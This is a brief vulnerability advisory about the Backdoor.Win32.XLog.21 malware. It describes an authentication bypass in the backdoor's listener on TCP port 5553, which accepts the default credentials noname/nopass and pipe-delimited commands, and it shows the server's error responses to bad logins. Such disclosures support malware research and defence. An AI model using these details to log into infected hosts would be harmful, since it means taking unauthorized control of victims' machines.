Threat: Backdoor.Win32.XLog.21
Vulnerability: Authentication Bypass Race Condition
Description: The malware listens on TCP port 5553. Third-party attackers
who can reach the system before a password has been set can logon using
default credentials of noname/nopass and run commands made avail by the
backdoor including changing the password therby potentially locking out the
original intruder.

Incorrect username "victim|pass" we get
Received invalid name parameter!

Incorrect password "noname|pass" we get
Received incorrect password from client!

Sending correct noname|nopass creds we get no error. Next, we must send
valid cmds using correct pipe delimiter or we will get "Received invalid
parameter" errors.
